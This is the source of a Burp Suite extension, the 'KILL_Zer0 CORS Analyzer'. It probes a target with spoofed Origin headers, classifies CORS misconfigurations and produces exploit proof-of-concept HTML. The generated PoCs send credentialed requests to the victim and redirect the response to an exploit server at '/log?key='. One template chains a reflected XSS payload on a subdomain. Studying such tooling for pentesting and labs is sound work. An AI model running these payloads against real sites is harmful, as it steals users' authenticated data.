# -*- coding: utf-8 -*-
from burp import IBurpExtender, IContextMenuFactory
from javax.swing import JMenuItem, JOptionPane, JTextArea, JScrollPane, JPanel, JTextField, JLabel, JPopupMenu, JButton, SwingUtilities, JTabbedPane, JTextPane, Timer
from javax.swing.text import DefaultEditorKit
from javax.swing import BoxLayout, BorderFactory
from java.awt import BorderLayout, FlowLayout, Font, Dimension
from java.awt.event import ActionListener
from java.util import ArrayList
import threading
import java.net.URL as URL
import traceback

# --- Helper Classes for robust UI Actions in Jython ---
class ResetButtonAction(ActionListener):
    def __init__(self, btn, text):
        self.btn = btn
        self.text = text
    def actionPerformed(self, evt):
        self.btn.setText(self.text)

class CopyBtnAction(ActionListener):
    def __init__(self, extender, text_area, btn):
        self.extender = extender
        self.text_area = text_area
        self.btn = btn
    def actionPerformed(self, evt):
        self.extender.copy_to_clipboard(self.text_area.getText())
        self.btn.setText("Copied!")
        timer = Timer(2000, ResetButtonAction(self.btn, "Copy PoC Code"))
        timer.setRepeats(False)
        timer.start()

class BurpExtender(IBurpExtender, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("KILL_Zer0 CORS Analyzer")
        callbacks.registerContextMenuFactory(self)
        print("[+] KILL_Zer0 CORS Analyzer Loaded.")
        print("[!] Engine: Baseline -> Fuzzing -> Correlation -> PoC Generation (Tabbed UI).")
        print("[!] Note: findings are behavior signals, not confirmed vulnerabilities. Manual confirmation is required before reporting impact.")

    def createMenuItems(self, invocation):
        menu_list = ArrayList()
        messages = invocation.getSelectedMessages()
        if not messages:
            return menu_list

        menuItem = JMenuItem("Analyze CORS Behavior & Generate PoC")
        menuItem.addActionListener(lambda x: self.start_analysis_flow(messages[0]))
        menu_list.add(menuItem)
        return menu_list

    def start_analysis_flow(self, messageInfo):
        input_panel = JPanel()
        input_panel.setLayout(BoxLayout(input_panel, BoxLayout.Y_AXIS))
        input_panel.add(JLabel("<html><b>CORS Behavior Analysis</b><br>Please enter your Exploit Server URL (No trailing slash):</html>"))
        input_panel.add(JLabel(" "))

        field_webhook = JTextField("https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net", 40)
        input_panel.add(field_webhook)

        result = JOptionPane.showConfirmDialog(
            None, input_panel, "KILL_Zer0 CORS Analyzer - Exploit Server Setup",
            JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE
        )

        if result != JOptionPane.OK_OPTION:
            return

        exploit_server = field_webhook.getText().strip()
        if exploit_server.endswith("/"):
            exploit_server = exploit_server[:-1]

        t = threading.Thread(target=self.run_detection_engine, args=(messageInfo, exploit_server))
        t.start()

    def run_detection_engine(self, messageInfo, exploit_server):
        try:
            http_service = messageInfo.getHttpService()
            request = messageInfo.getRequest()
            reqInfo = self._helpers.analyzeRequest(http_service, request)

            url_obj = URL(reqInfo.getUrl().toString())
            target_url = reqInfo.getUrl().toString()
            method = reqInfo.getMethod()
            host = url_obj.getHost()

            body_offset = reqInfo.getBodyOffset()
            body = self._helpers.bytesToString(request[body_offset:]) if body_offset < len(request) else ""

            probe_summary = {"sent": 0, "completed": 0, "failed": 0}

            # 1. Preflight Requirement Analysis (predicted from request structure;
            #    this does NOT send an actual OPTIONS request)
            preflight_status, preflight_reason = self.analyze_preflight_requirement(reqInfo)

            # 2. Baseline Request
            baseline_result = self.send_probe(http_service, reqInfo, request, None)
            if baseline_result:
                probe_summary["sent"] += 1
                probe_summary["completed"] += 1

            # 3. Origin Fuzzing Engine
            fuzz_probes = self.build_probes(host)
            probe_results = {}
            for probe in fuzz_probes:
                probe_summary["sent"] += 1
                res = self.send_probe(http_service, reqInfo, request, probe["payload"])
                if res:
                    probe_results[probe["name"]] = {
                        "probe_info": probe,
                        "result": res
                    }
                    probe_summary["completed"] += 1
                else:
                    probe_summary["failed"] += 1

            # 4. Response Sensitivity Heuristic (keyword-based; not exhaustive)
            sensitivity_level, sensitivity_indicators = self.analyze_sensitivity(messageInfo)

            # 5. Scenario Registry & Evaluation
            scenarios = [
                NullOriginScenario(),
                BasicReflectionScenario(),
                PrefixBypassScenario(),
                SuffixBypassScenario(),
                TrustedInsecureProtocolScenario(),
                TrustedSecureProtocolScenario(),
                PublicWildcardScenario(),
                InternalNetworkScenario()
            ]

            findings = []
            for scenario in scenarios:
                finding = scenario.evaluate(baseline_result, probe_results, host)
                if finding:
                    findings.append(finding)

            if not findings:
                findings.append({
                    "name": "No CORS Behavior Signals Found",
                    "detection": "NOT DETECTED BY CURRENT PROBES",
                    "impact": "N/A",
                    "evidence": "All probes returned safe or strict responses compared to the baseline.",
                    "manual_action": "None",
                    "poc_type": "NONE"
                })

            # 6. Generate PoC for relevant findings
            for finding in findings:
                if finding["poc_type"] != "NONE":
                    finding["poc_code"] = self.generate_poc_structure(
                        finding.get("scenario_id", ""), method, target_url, body, host, exploit_server, finding["poc_type"]
                    )
                else:
                    finding["poc_code"] = ""

            # 7. UI rendering
            SwingUtilities.invokeLater(lambda: self.show_results(
                target_url, method, sensitivity_level, sensitivity_indicators,
                preflight_status, preflight_reason, probe_summary, findings
            ))

        except Exception as e:
            print("Engine Error: " + str(e))
            traceback.print_exc()
            try:
                SwingUtilities.invokeLater(lambda: JOptionPane.showMessageDialog(
                    None,
                    "The analysis failed with an error:\n" + str(e) + "\n\nSee the extension's Output tab for details.",
                    "KILL_Zer0 CORS Analyzer - Error",
                    JOptionPane.ERROR_MESSAGE
                ))
            except Exception:
                pass

    def analyze_preflight_requirement(self, reqInfo):
        method = reqInfo.getMethod().upper()
        headers = [h.lower() for h in reqInfo.getHeaders()]

        is_simple_method = method in ["GET", "HEAD", "POST"]
        has_custom_headers = False
        complex_content_type = False

        for h in headers:
            if h.startswith("content-type:"):
                ctype = h.split(":", 1)[1].strip()
                if ctype not in ["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]:
                    complex_content_type = True
            elif not any(h.startswith(sh) for sh in ["host:", "user-agent:", "accept", "content-length:", "connection:", "cookie:", "origin:", "referer:", "sec-"]):
                has_custom_headers = True

        if not is_simple_method:
            return "PREFLIGHT_LIKELY", "HTTP Method '%s' is not a CORS-safelisted method." % method
        elif has_custom_headers:
            return "PREFLIGHT_LIKELY", "Request contains non-safelisted custom headers."
        elif complex_content_type:
            return "PREFLIGHT_LIKELY", "Content-Type triggers preflight."

        return "PREFLIGHT_UNLIKELY", "Request appears to be a simple CORS request; a browser would likely skip the OPTIONS preflight."

    def build_probes(self, host):
        return [
            {
                "name": "null_origin",
                "payload": "null",
                "purpose": "Test if application explicitly whitelists the 'null' string."
            },
            {
                "name": "arbitrary_origin",
                "payload": "https://killzer0-attacker.com",
                "purpose": "Test if application reflects any supplied origin blindly."
            },
            {
                "name": "prefix_bypass",
                "payload": "https://" + host + ".killzer0-attacker.com",
                "purpose": "Test validation logic flaw (startsWith validation)."
            },
            {
                "name": "suffix_bypass",
                "payload": "https://killzer0-attacker" + host,
                "purpose": "Test validation logic flaw (endsWith validation missing a dot delimiter)."
            },
            {
                "name": "insecure_subdomain",
                "payload": "http://stock." + host,
                "purpose": "Test trust of arbitrary subdomains over HTTP."
            },
            {
                "name": "secure_subdomain",
                "payload": "https://random-sub." + host,
                "purpose": "Test trust of arbitrary secure subdomains."
            }
        ]

    def send_probe(self, http_service, reqInfo, original_request, origin_payload):
        headers = list(reqInfo.getHeaders())
        new_headers = [h for h in headers if not h.lower().startswith("origin:")]

        if origin_payload is not None:
            new_headers.append("Origin: " + origin_payload)

        body_offset = reqInfo.getBodyOffset()
        body = original_request[body_offset:]

        new_request = self._helpers.buildHttpMessage(new_headers, body)
        try:
            response = self._callbacks.makeHttpRequest(http_service, new_request)
            if not response or not response.getResponse():
                return None

            respInfo = self._helpers.analyzeResponse(response.getResponse())

            acao = None
            acac = False
            content_type = ""

            for h in respInfo.getHeaders():
                hl = h.lower()
                if hl.startswith("access-control-allow-origin:"):
                    acao = h.split(":", 1)[1].strip()
                elif hl.startswith("access-control-allow-credentials:"):
                    if "true" in hl:
                        acac = True
                elif hl.startswith("content-type:"):
                    content_type = h.split(":", 1)[1].strip()

            body_len = len(response.getResponse()) - respInfo.getBodyOffset()

            return {
                "status_code": respInfo.getStatusCode(),
                "content_type": content_type,
                "length": body_len,
                "acao": acao,
                "acac": acac,
                "origin_sent": origin_payload
            }
        except Exception as e:
            return None

    def analyze_sensitivity(self, messageInfo):
        response = messageInfo.getResponse()
        if not response:
            return "UNKNOWN", "No baseline response to analyze."

        respInfo = self._helpers.analyzeResponse(response)
        body = self._helpers.bytesToString(response[respInfo.getBodyOffset():]).lower()

        indicators = []

        # FIX: was an exact-match check against a full header line, which almost
        # never matches. Now checks the Content-Type value as a substring.
        is_json = any(
            h.lower().startswith("content-type:") and "application/json" in h.lower()
            for h in respInfo.getHeaders()
        )
        if is_json:
            indicators.append("JSON Response Format")

        secrets = ["api_key", "apikey", "session", "token", "password", "private", "email", "@", "ssn", "credit_card", "auth"]
        found = [s for s in secrets if s in body]
        if found:
            indicators.append("Contains sensitive keywords (%s)" % ", ".join(found))

        if not indicators:
            return "LOW (heuristic)", "No obvious sensitive indicators detected. This is a keyword-based heuristic only " \
                   "and can miss sensitive data (e.g. names, addresses, IDs) that don't match the keyword list " \
                   "-- manually inspect the response body."
        else:
            return "POTENTIALLY SENSITIVE (heuristic)", " | ".join(indicators) + \
                   " -- keyword match only, manually confirm actual sensitivity."

    def generate_poc_structure(self, scenario_id, method, url, body, host, exp_svr, poc_type):
        # Escape backslash, double quote AND single quote: these values are embedded
        # both inside a double-quoted HTML attribute (srcdoc="...") and inside
        # single-quoted JS string literals (req.open('%s','%s',...)). Missing the
        # single-quote escape let a stray ' in the URL break the generated PoC's own JS.
        def js_escape(s):
            return s.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'")

        m = js_escape(method.lower())
        u = js_escape(url)
        b = body.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${") if body else ""

        html = []
        confirmation_note = (
            "<!-- NOTE: this PoC demonstrates the CORS behavior observed. It does NOT confirm that the "
            "response contains sensitive or exploitable data. Manually verify the leaked response before "
            "reporting impact. -->"
        )

        if scenario_id == "NULL_ORIGIN":
            html.append(confirmation_note)
            html.append('<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>')
            html.append("    var req = new XMLHttpRequest();")
            html.append("    req.onload = reqListener;")
            html.append("    req.open('%s','%s',true);" % (m, u))
            html.append("    req.withCredentials = true;")
            html.append("    req.send(%s);" % ("`"+b+"`" if b else ""))
            html.append("    function reqListener() {")
            html.append("        location='%s/log?key='+encodeURIComponent(this.responseText);" % exp_svr)
            html.append("    };")
            html.append('</script>"></iframe>')

        elif scenario_id in ["BASIC_REFLECTION", "PREFIX_BYPASS", "SUFFIX_BYPASS"]:
            html.append(confirmation_note)
            html.append('<script>')
            html.append("    var req = new XMLHttpRequest();")
            html.append("    req.onload = reqListener;")
            html.append("    req.open('%s','%s',true);" % (m, u))
            html.append("    req.withCredentials = true;")
            html.append("    req.send(%s);" % ("`"+b+"`" if b else ""))
            html.append("    function reqListener() {")
            html.append("        location='%s/log?key='+encodeURIComponent(this.responseText);" % exp_svr)
            html.append("    };")
            html.append('</script>')

        elif scenario_id == "HTTP_SUBDOMAIN":
            html.append(confirmation_note)
            html.append('<!-- MANUAL ACTION: Identify an XSS parameter on stock.%s (e.g., productId) -->' % host)
            html.append('<script>')
            inner_js = "var req = new XMLHttpRequest(); req.onload = reqListener; "
            inner_js += "req.open('%s','%s',true); req.withCredentials = true; req.send(); " % (m, u)
            inner_js += "function reqListener() { location='%s/log?key='%%2bencodeURIComponent(this.responseText); };" % exp_svr
            payload = 'document.location="http://stock.%s/?productId=4<script>%s%%3c/script>&storeId=1"' % (host, inner_js)
            html.append('    ' + payload)
            html.append('</script>')

        elif scenario_id == "HTTPS_SUBDOMAIN":
            html.append(confirmation_note)
            html.append('<!-- MANUAL ACTION: Inject this script via XSS or Subdomain Takeover on a valid subdomain. -->')
            html.append('<script>')
            html.append("    var req = new XMLHttpRequest();")
            html.append("    req.onload = reqListener;")
            html.append("    req.open('%s','%s',true);" % (m, u))
            html.append("    req.withCredentials = true;")
            html.append("    req.send(%s);" % ("`"+b+"`" if b else ""))
            html.append("    function reqListener() {")
            html.append("        location='%s/log?key='+encodeURIComponent(this.responseText);" % exp_svr)
            html.append("    };")
            html.append('</script>')

        return "\n".join(html)

    def show_results(self, target, method, sensitivity, sens_ind, pref_status, pref_reason, probe_summary, findings):
        main_panel = JPanel(BorderLayout())
        main_panel.setPreferredSize(Dimension(900, 720))

        tabs = JTabbedPane()

        # ==========================================
        # TAB 1: Analysis & Findings (Separated from PoC)
        # ==========================================
        report_html = "<html><body style='font-family: sans-serif; padding: 10px;'>"
        report_html += "<h2 style='color: #2c3e50;'>CORS Behavior Analysis Report</h2>"
        report_html += "<p style='color:#7f8c8d;'><i>These are behavior signals derived from automated probing, not confirmed " \
                        "vulnerabilities. Confirm actual impact (readable response, real sensitive data) manually before reporting.</i></p>"

        report_html += "<h3>Target Information</h3>"
        report_html += "<b>Endpoint:</b> %s %s<br>" % (method, target)
        report_html += "<b>Response Sensitivity (heuristic):</b> %s<br>" % sensitivity
        report_html += "<b>Indicators:</b> %s<br>" % sens_ind

        report_html += "<h3>Engine Summary</h3>"
        pref_label = "Preflight likely required" if pref_status == "PREFLIGHT_LIKELY" else "Preflight likely not required"
        report_html += "<b>Preflight Requirement (predicted, no OPTIONS request sent):</b> %s (%s)<br>" % (pref_label, pref_reason)
        report_html += "<b>Probing Engine:</b> Sent %d | Completed %d | Failed %d<br>" % (probe_summary["sent"], probe_summary["completed"], probe_summary["failed"])

        report_html += "<h3>Findings</h3>"

        for f in findings:
            det = f["detection"]
            impact = f.get("impact", f.get("exploitability", "UNKNOWN"))
            det_color = "#e74c3c" if det not in ("NOT DETECTED BY CURRENT PROBES", "INFORMATIONAL") else "#27ae60"
            if det == "INFORMATIONAL" or det == "MANUAL VERIFICATION REQUIRED":
                det_color = "#f39c12"
            impact_color = "#f39c12"

            report_html += "<div style='background-color: #f9f9f9; padding: 10px; border-left: 4px solid %s; margin-bottom: 10px;'>" % det_color
            report_html += "<b>Finding:</b> %s<br>" % f["name"]
            report_html += "<b>CORS Behavior:</b> <span style='color: %s; font-weight: bold;'>%s</span><br>" % (det_color, det)
            report_html += "<b>Impact:</b> <span style='color: %s; font-weight: bold;'>%s</span><br>" % (impact_color, impact)
            report_html += "<b>Evidence:</b> %s<br>" % f.get("evidence", "N/A")
            report_html += "<b>Manual Action Required:</b> %s<br>" % f.get("manual_action", "None")
            report_html += "</div>"

        report_html += "</body></html>"

        text_pane = JTextPane()
        text_pane.setContentType("text/html")
        text_pane.setEditable(False)
        text_pane.setText(report_html)

        tabs.addTab("Analysis & Findings", JScrollPane(text_pane))

        # ==========================================
        # TAB 2: Dedicated Exploit PoC Area
        # ==========================================
        poc_panel = JPanel(BorderLayout(5, 5))
        poc_panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        combined_poc = ""
        for f in findings:
            if f.get("poc_code"):
                combined_poc += "<!-- ========================================= -->\n"
                combined_poc += "<!-- Finding: %s -->\n" % f["name"]
                combined_poc += "<!-- Type: %s -->\n" % f["poc_type"]
                combined_poc += "<!-- ========================================= -->\n\n"
                combined_poc += f["poc_code"] + "\n\n\n"

        if not combined_poc.strip():
            combined_poc = "<!-- No PoC generated for the current target. -->"

        code_area = JTextArea(combined_poc)
        code_area.setEditable(True)
        code_area.setFont(Font("Monospaced", Font.PLAIN, 13))

        # Right-click menu for fallback
        popup = JPopupMenu()
        for action_name, action_obj in [("Copy", DefaultEditorKit.CopyAction()), ("Cut", DefaultEditorKit.CutAction()), ("Paste", DefaultEditorKit.PasteAction())]:
            item = JMenuItem(action_obj)
            item.setText(action_name)
            popup.add(item)
        popup.addSeparator()
        select_all = JMenuItem("Select All")
        select_all.addActionListener(lambda e, ta=code_area: ta.selectAll())
        popup.add(select_all)
        code_area.setComponentPopupMenu(popup)

        poc_panel.add(JScrollPane(code_area), BorderLayout.CENTER)

        # Smart Copy Button
        btn_panel = JPanel(FlowLayout(FlowLayout.RIGHT))
        copy_btn = JButton("Copy PoC Code")
        copy_btn.addActionListener(CopyBtnAction(self, code_area, copy_btn))
        btn_panel.add(copy_btn)

        poc_panel.add(btn_panel, BorderLayout.SOUTH)

        tabs.addTab("Exploit PoC Code", poc_panel)

        main_panel.add(tabs, BorderLayout.CENTER)

        JOptionPane.showMessageDialog(None, main_panel, "KILL_Zer0 CORS Analyzer", JOptionPane.PLAIN_MESSAGE)

    def copy_to_clipboard(self, text):
        from java.awt import Toolkit
        from java.awt.datatransfer import StringSelection
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(text), None)

# ==========================================
# SCENARIO REGISTRY
# ==========================================

class BaseScenario:
    def check_match(self, probe_result, expected_acao):
        if not probe_result: return False
        return probe_result["result"]["acao"] == expected_acao and probe_result["result"]["acac"]

class NullOriginScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if "null_origin" in probes and self.check_match(probes["null_origin"], "null"):
            return {
                "scenario_id": "NULL_ORIGIN",
                "name": "Trusted Null Origin",
                "detection": "CORS BEHAVIOR: NULL ORIGIN TRUSTED",
                "impact": "REQUIRES MANUAL CONFIRMATION",
                "evidence": "Probe 'null_origin' resulted in ACAO: null with ACAC: true.",
                "manual_action": "Confirm the response actually contains sensitive/exploitable data before treating this as a finding.",
                "poc_type": "EXPLOIT"
            }
        return None

class BasicReflectionScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if "arbitrary_origin" in probes and self.check_match(probes["arbitrary_origin"], probes["arbitrary_origin"]["probe_info"]["payload"]):
            return {
                "scenario_id": "BASIC_REFLECTION",
                "name": "Basic Origin Reflection",
                "detection": "CORS BEHAVIOR: ARBITRARY ORIGIN REFLECTED",
                "impact": "REQUIRES MANUAL CONFIRMATION",
                "evidence": "Probe 'arbitrary_origin' was reflected exactly in ACAO with ACAC: true.",
                "manual_action": "Confirm the response actually contains sensitive/exploitable data before treating this as a finding.",
                "poc_type": "EXPLOIT"
            }
        return None

class PrefixBypassScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if "prefix_bypass" in probes and self.check_match(probes["prefix_bypass"], probes["prefix_bypass"]["probe_info"]["payload"]):
            return {
                "scenario_id": "PREFIX_BYPASS",
                "name": "Prefix Validation Weakness",
                "detection": "CORS BEHAVIOR: PREFIX VALIDATION BYPASS",
                "impact": "REQUIRES MANUAL CONFIRMATION",
                "evidence": "Probe 'prefix_bypass' (%s) bypassed validation. Target likely uses a flawed startsWith() check." % probes["prefix_bypass"]["probe_info"]["payload"],
                "manual_action": "Register a domain matching the bypassed pattern, then confirm the response is actually sensitive/exploitable.",
                "poc_type": "EXPLOIT"
            }
        return None

class SuffixBypassScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if "suffix_bypass" in probes and self.check_match(probes["suffix_bypass"], probes["suffix_bypass"]["probe_info"]["payload"]):
            return {
                "scenario_id": "SUFFIX_BYPASS",
                "name": "Suffix Validation Weakness",
                "detection": "CORS BEHAVIOR: SUFFIX VALIDATION BYPASS",
                "impact": "REQUIRES MANUAL CONFIRMATION",
                "evidence": "Probe 'suffix_bypass' (%s) bypassed validation. Target likely uses a flawed endsWith() check missing a dot delimiter." % probes["suffix_bypass"]["probe_info"]["payload"],
                "manual_action": "Register a domain matching the bypassed pattern, then confirm the response is actually sensitive/exploitable.",
                "poc_type": "EXPLOIT"
            }
        return None

class TrustedInsecureProtocolScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if "insecure_subdomain" in probes and self.check_match(probes["insecure_subdomain"], probes["insecure_subdomain"]["probe_info"]["payload"]):
            return {
                "scenario_id": "HTTP_SUBDOMAIN",
                "name": "Trusted Insecure Protocol (HTTP Subdomain)",
                "detection": "CORS BEHAVIOR: HTTP SUBDOMAIN TRUSTED",
                "impact": "REQUIRES CHAINING + MANUAL CONFIRMATION",
                "evidence": "Probe 'insecure_subdomain' over HTTP was trusted with ACAC: true.",
                "manual_action": "Verify whether XSS exists on any HTTP subdomain (or perform a MITM). PoC template assumes a PortSwigger-lab-style 'productId' parameter -- adapt it to the real target.",
                "poc_type": "TEMPLATE"
            }
        return None

class TrustedSecureProtocolScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if "secure_subdomain" in probes and self.check_match(probes["secure_subdomain"], probes["secure_subdomain"]["probe_info"]["payload"]):
            return {
                "scenario_id": "HTTPS_SUBDOMAIN",
                "name": "Trusted Secure Arbitrary Subdomain",
                "detection": "CORS BEHAVIOR: ARBITRARY HTTPS SUBDOMAIN TRUSTED",
                "impact": "REQUIRES CHAINING + MANUAL CONFIRMATION",
                "evidence": "Probe 'secure_subdomain' was trusted with ACAC: true.",
                "manual_action": "Subdomain takeover or an XSS on a trusted subdomain is required to actually exploit this trust relationship.",
                "poc_type": "TEMPLATE"
            }
        return None

class PublicWildcardScenario(BaseScenario):
    def evaluate(self, baseline, probes, host):
        if baseline and baseline["acao"] == "*" and not baseline["acac"]:
            return {
                "scenario_id": "PUBLIC_WILDCARD",
                "name": "Public API CORS Configuration",
                "detection": "INFORMATIONAL",
                "impact": "LIKELY BENIGN -- ONLY A CONCERN IF THE ENDPOINT RETURNS USER-SPECIFIC/PII DATA",
                "evidence": "Baseline request returned ACAO: * without credentials. This is expected/safe for genuinely public assets or APIs.",
                "manual_action": "Check whether the endpoint exposes PII or user-specific data despite the wildcard; a bare '*' with no credentials is not a vulnerability by itself.",
                "poc_type": "NONE"
            }
        return None

class InternalNetworkScenario(BaseScenario):
    # FIX: previous check only matched "172.16." exactly, missing the rest of the
    # RFC1918 172.16.0.0/12 block (172.17.x.x through 172.31.x.x).
    def _is_private_ip(self, host):
        if host == "localhost" or host.startswith("127.") or host.startswith("10.") or host.startswith("192.168."):
            return True
        if host.startswith("172."):
            parts = host.split(".")
            if len(parts) >= 2:
                try:
                    second_octet = int(parts[1])
                    if 16 <= second_octet <= 31:
                        return True
                except ValueError:
                    pass
        return False

    def evaluate(self, baseline, probes, host):
        is_private = self._is_private_ip(host)
        if is_private and baseline and baseline["acao"]:
            return {
                "scenario_id": "INTERNAL_CORS",
                "name": "Environment-Dependent CORS",
                "detection": "MANUAL VERIFICATION REQUIRED",
                "impact": "UNKNOWN -- DEPENDS ON NETWORK ARCHITECTURE",
                "evidence": "Target is on a private IP address space (RFC1918) and returns CORS headers.",
                "manual_action": "ACAC=true is not strictly required for intranet exploitation if authentication is IP-based. Verify the actual network/trust architecture before reporting this as a finding.",
                "poc_type": "NONE"
            }
        return None